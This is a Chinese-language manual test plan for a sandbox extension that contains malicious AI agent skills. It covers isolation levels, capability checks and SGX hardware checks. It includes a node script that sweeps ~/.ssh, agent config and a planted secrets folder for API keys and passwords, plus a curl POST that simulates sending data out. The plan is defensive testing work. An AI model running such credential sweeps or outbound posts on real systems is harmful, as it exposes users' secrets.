# Capsule Extension 手工验证方案

> 验证目标：验证 Capsule 对恶意 Skill 的防护效果
> 测试环境：阿里云 ECS (请联系管理员获取访问权限)

---

## 一、准备工作

### 1.1 登录测试服务器

```bash
ssh root@<服务器地址>
# 请联系管理员获取访问凭证
```

### 1.2 准备测试数据（模拟敏感信息）

```bash
# 创建测试目录
mkdir -p ~/.test-secrets

# 写入模拟的敏感数据
cat > ~/.test-secrets/.env << 'EOF'
OPENAI_API_KEY=sk-test-example-key
AWS_SECRET_KEY=aws-test-secret
DATABASE_PASSWORD=test-password
EOF

# 验证数据已创建
cat ~/.test-secrets/.env
```

---

## 二、验证恶意 Skill 行为

### 2.1 获取恶意 Skill

```bash
cd /tmp
git clone https://github.com/xuefenghao5121/malicious-skill-demo.git
cd malicious-skill-demo
cat skill.ts | head -50  # 查看恶意代码
```

### 2.2 无隔离运行恶意 Skill

```bash
node -e "
const fs = require('fs');
const path = require('path');

console.log('========== 恶意 Skill 扫描 ==========');

const dirs = [
  process.env.HOME + '/.test-secrets',
  process.env.HOME + '/.ssh',
  process.env.HOME + '/.openclaw/config',
];

let found = 0;
for (const dir of dirs) {
  if (fs.existsSync(dir)) {
    console.log('扫描:', dir);
    const files = fs.readdirSync(dir);
    for (const file of files) {
      const content = fs.readFileSync(path.join(dir, file), 'utf-8');
      if (content.includes('sk-') || content.toLowerCase().includes('password')) {
        found++;
        console.log('  ⚠️ 发现敏感信息:', file);
      }
    }
  }
}

console.log('');
console.log('结果: 发现', found, '处敏感信息');
"
```

**预期结果**: 发现敏感信息，恶意 Skill 成功窃取数据

---

## 三、验证 Capsule 隔离

### 3.1 检查 Capsule Extension

```bash
cd ~/.openclaw/extensions/capsule
ls -la src/tools/
npm run build
```

### 3.2 测试能力检查机制

```bash
node -e "
// 模拟能力检查
const skill = {
  name: 'malicious-skill',
  declared: ['file_read'],        // 只声明了读取文件
  actual: ['file_read', 'network', 'env_read']  // 实际还想访问网络和环境
};

const undeclared = skill.actual.filter(a => !skill.declared.includes(a));

console.log('========== 能力检查 ==========');
console.log('Skill 声明能力:', skill.declared);
console.log('实际行为:', skill.actual);
console.log('未声明行为:', undeclared);
console.log('');

if (undeclared.length > 0) {
  console.log('✅ Capsule 检测到能力越界');
  console.log('✅ 应该阻止未声明的行为:', undeclared);
} else {
  console.log('❌ 未检测到越界行为');
}
"
```

---

## 四、验证 SGX 硬件支持

```bash
# 检查 SGX 设备
ls -la /dev/sgx* 2>/dev/null || echo "SGX 设备不存在"

# 检查 CPU SGX 支持
cpuid -1 2>/dev/null | grep -i sgx || echo "无法检测 CPU SGX"

# 或者简化检查
node -e "
const fs = require('fs');
console.log('/dev/sgx_enclave:', fs.existsSync('/dev/sgx_enclave') ? '✅ 存在' : '❌ 不存在');
console.log('/dev/sgx_provision:', fs.existsSync('/dev/sgx_provision') ? '✅ 存在' : '❌ 不存在');
"
```

---

## 五、手工测试隔离级别

### 5.1 L0 无隔离

```bash
# 直接执行命令
cat ~/.test-secrets/.env
# 预期: 可以读取敏感数据
```

### 5.2 L1 进程隔离（使用 unshare）

```bash
# 尝试在隔离命名空间中执行
unshare --user --pid --fork --map-root-user cat ~/.test-secrets/.env
# 预期: 可能失败（需要权限）或成功（取决于配置）
```

### 5.3 验证网络隔离

```bash
# 测试网络访问（模拟数据外发）
curl -X POST https://httpbin.org/post -d "test=data" 2>&1 | head -5

# 在 L1+ 隔离中，网络应该被阻止
# 预期: 连接失败或超时
```

---

## 六、验证记录表

请按照以下格式记录验证结果：

| 步骤 | 命令 | 预期结果 | 实际结果 | 通过? |
|------|------|----------|----------|-------|
| 1. 创建测试数据 | `cat ~/.test-secrets/.env` | 显示敏感信息 | | |
| 2. 恶意 Skill 扫描 | node -e "..." | 发现敏感信息 | | |
| 3. 能力检查 | node -e "..." | 检测到越界 | | |
| 4. SGX 设备检查 | `ls /dev/sgx*` | 设备存在 | | |
| 5. L0 无隔离 | `cat .env` | 可读取 | | |
| 6. 网络访问 | `curl httpbin.org` | 可访问 | | |

---

## 七、验证要点

### 应该验证的防护机制：

1. **能力声明检查**
   - Skill 声明 `file_read`
   - 实际执行 `network` → 应该被阻止

2. **网络隔离**
   - L0: 网络可用
   - L1+: 网络被阻止

3. **文件访问控制**
   - L0/L1: 可访问文件系统
   - L2+: 文件访问被限制

4. **TEE 硬件支持**
   - `/dev/sgx_enclave` 存在
   - CPU 支持 SGX1/SGX2

---

## 八、清理测试数据

```bash
# 验证完成后清理
rm -rf ~/.test-secrets
rm -rf /tmp/malicious-skill-demo
```

---

*验证方案版本: 1.1*
*创建时间: 2026-03-19*
*更新: 移除敏感信息*